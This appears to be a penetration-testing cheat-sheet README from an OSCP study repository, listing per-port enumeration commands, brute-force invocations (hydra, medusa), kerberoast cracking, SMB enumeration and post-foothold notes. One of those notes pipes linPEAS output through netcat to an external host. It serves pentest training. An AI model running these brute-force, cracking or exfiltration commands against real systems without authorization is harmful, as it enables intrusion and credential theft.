### Enumeration

- [initial](initial_recon/README.md)

* ### 21 FTP
```
sudo nmap -sV --script='ftp-vuln*,ftp-enum*,ftp-anon*' -p 21 -vvv
sudo nmap --script='ftp-vsftpd-backdoor,ftp-syst' -p 21
sudo nmap --script ftp-* -p 21
nc -vn $IP 21
openssl s_client -connect $IP:21 -starttls ftp
```
> bruteforce
```
hydra -L USER_LIST -P PASS_LIST -f -o ftphydra.txt -u $IP_ADD -s 21 ftp
```
> Download contents
```
wget -m ftp://user:pass@IP
wget -m --no-passive ftp://user:pass@IP
```

* ### 22 SSH

```
nmap -p22 <ip> --script ssh2-enum-algos 
nmap -p22 <ip> --script ssh-hostkey --script-args ssh_hostkey=full
nmap -p22 <ip> --script ssh-auth-methods --script-args="ssh.user=root"
```

>  bruteforce
```
hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt -t 10 $IP_ADD ssh -s 22
medusa -u USER -P /usr/share/wordlists/rockyou.txt -e ns -h $IP_ADD:22 - 22 -M ssh
```
- [user:pass.txt](wordlists/ssh_user_pass.txt)

- [rapid7 bad keys](https://github.com/rapid7/ssh-badkeys/tree/master/authorized)

> #### SSH Tunnels

* [Guide to SSH Tunnels and Proxies](https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6)

* ### 23 Telnet
```
nmap -n -sV -Pn --script "*telnet* and safe" -p 23
```
> wireshark
```
tcp.port == 23 and ip.addr != myip
```


* ### 25 SMTP
> nmap

```
sudo nmap --script='smtp-enum-users' -p 25 $IP_ADD
```
> connecting

```
nc -nv $IP_ADD 25
HELO a
EXPN root	-Enumeration
VRFY user	-Enumeration
# mail
MAIL FROM:user
RCPT TO:user
DATA Hello
.
```
> brute force
```
hydra -P /usr/share/wordlistsnmap.lst $IP_ADD smtp -V
```

> scripts / links

* [smtp_connect.py](https://github.com/D4nk0St0rM/pentest_ethical_hacking_oscp/blob/main/scripts/smtp_connect.py)
* [pentestmonkey smtp user enumeration](https://pentestmonkey.net/tools/user-enumeration/smtp-user-enum)


* #### 53 DNS
```
dig axfr DOMAIN @$IP_ADD
host DOMAIN
host -t ns DOMAIN
host -t axfr  DOMAIN NAMESERVER
host -l DOMAIN NAMESERVER
dnsenum --noreverse DOMAIN
dnsrecon -d DOMAIN

```
> nmap
```
sudo nmap -T4 -p 53 --script='dns-brute'

```

> links
* [dnsdumpster](https://dnsdumpster.com/)
* [netcraft](https://searchdns.netcraft.com)




* ### Web applications, services, 80 / 443

> [web_servers_applications](/method/web_servers_applications/README.md)



* #### 88 Kerberost
```
Rpcclient -U “” -N <IP>

Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=’<domain>’,userdb=/root/Desktop/usernames.txt <IP>
```

> tools
* [kerbrute](https://github.com/ropnop/kerbrute)
* [GetNPUsers](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetNPUsers.py)
* 

> kerberoast
```
# download service ticket
# sudo apt install kerberoast 
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-23a45000-USER@Server.com-CORP.COM.kirbi

```
> links

* [TCM Security - Kerberoasting domain accounts](https://tcm-sec.com/kerberoasting-domain-accounts/?utm_source=rss&utm_medium=rss&utm_campaign=kerberoasting-domain-accounts)
* [Pentest Partners - How to kerberoast like a boss](https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/)


* #### 110 POP3
```
* pop3 alt port
```
* #### 111 NFS
```
nmap -p 111 --script='nfs*'
```

* #### 123 NTP
* #### 135 RPC
* #### 139/445 SMB

- [method](method/smb/README.md)
- [eternalblue](https://redteamzone.com/EternalBlue/)

```
rpcinfo -p
sudo nmap --script='smb-vuln-ms17-010' -p 139,445 -vvv
sudo nmap --script='smb-vuln*,smb-enum*,smb-mbenum*' -p 139,445 -vvv
enum4linux -a
smbclient --no-pass -c 'recurse;ls' ////IP_ADD//ADMIN$
smbclient -L IP_ADD --shares
smbclient -L IP_ADD --pass-pol
smbmap -H IP_ADD -u anonymous
crackmapexec smb IP_ADD --shares

* smbpasswd
* mount smb
* enum shares
* smbget
* rpcclient
  * rpclient help
  * enum printers
  * bash query RID

```
* #### 143 IMAP
* #### 161 SNMP
* #### 389/3269 LDAP
* #### 554 RTSP
* #### 593 RPC over HTTP
* #### 631 Printers
* #### 636 LDAP
* #### 1056 Trojan / Virus
* #### 1433 SQL
```
* SQLMAP
```
* #### 1521 Oracle
* #### 2049 NFS
```
* show mount
```
* #### 3306 MYSQL
```
* msfconsole
* SQLMAP
* mysql with creds
```
* #### 3389 RDP
```
* xfreerdo
* remmina
```

* #### 5901 VNC
* #### 5985 WinRM
- [pywinrm](https://github.com/diyan/pywinrm)

```
* crackmapexec winrm
* Evil-WinRM
```
* #### 6379 REDIS

* #### 8080 Web Servers
```
* HttpFileServer HFS
* Jenkins/Jetty
* Tomcat
```




## Initial foothold

## Inside with foothold - enumeration

### linux
```
# output linpeas to termbin with nc if available
./linPeas.sh | nc termbin.com 9999

# list applications
find / -user root -perm -4000 -exec ls -ldb {} \;
 
```
> links

* [dirty cow check](https://github.com/D4nk0St0rM/pentest_ethical_hacking_oscp/blob/main/scripts/dirtycow_check.sh)
 
 

### windows
 ```
 # win 8.3 notation
dir /a /s /b > c:\tmp\myfile.txt
for /F "usebackq tokens=*" %A in ("c:\tmp\myfile.txt") do @echo %~sA >> c:\tmp\eightpointthree.txt

 
 ```
 

 ### general
```
# output linpeas to JSON
https://github.com/carlospolop/PEASS-ng/tree/master/parser

```

## Buffer Overflow

* [noobsec](https://www.noobsec.net/bof/)








* * *
#### :panda_face: Credits & thanks for the many resources out there supporting the OSCP journey:
including (not exhaustive):
* * *
- tjnull
- ippsec
- cybermentor
- abatchy
- scund00r
- 21y4d
- redteamtutorials
- noobsec
- hacktricks
- mjkranch
- sans.org
- htb
- vhl
- g0tm1lk
- @Rainsec_
- Arr0way

* [More linked here](https://github.com/D4nk0St0rM/pentest_ethical_hacking_oscp/blob/main/other_resources/README.md)
others linked where appropriate in files

* * *